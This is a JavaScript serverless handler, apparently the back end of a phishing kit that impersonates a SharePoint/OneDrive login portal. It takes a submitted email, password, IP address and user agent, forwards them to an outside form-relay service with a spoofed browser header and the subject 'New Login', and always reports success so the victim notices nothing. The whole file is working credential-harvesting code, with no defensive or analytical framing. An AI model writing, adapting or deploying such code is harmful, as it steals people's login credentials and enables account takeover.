// api/collect.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, ip, userAgent } = req.body;

    const message = `
🔐 New Credentials
📧 Email: ${email || 'N/A'}
🔑 Password: ${password || 'N/A'}
🌐 IP: ${ip || 'Unknown'}
📱 User-Agent: ${userAgent || 'N/A'}
⏰ Time: ${new Date().toISOString()}
    `;

    const response = await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Origin': 'https://share-point-git-main-talismans-projects-03c258fa.vercel.app',
        'Referer': 'https://share-point-git-main-talismans-projects-03c258fa.vercel.app/',
      },
      body: JSON.stringify({
        access_key: 'a682d4f0-f5ae-4c34-a6f6-f29d10f9c24b',
        subject: 'New Login',
        from_name: 'OneDrive Portal',
        email: email || 'No email',
        password: password || 'No password',
        ip: ip || 'Unknown',
        userAgent: userAgent || 'Unknown',
        message: message.trim(),
      }),
    });

    // Read as text first so we can log exactly what came back
    const rawText = await response.text();
    console.log('Web3Forms status:', response.status);
    console.log('Web3Forms body:', rawText.slice(0, 500));

    let data = {};
    try {
      data = JSON.parse(rawText);
    } catch (e) {
      console.log('Could not parse JSON, raw response was HTML/text');
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in collect handler:', error);
    return res.status(200).json({ success: true });
  }
}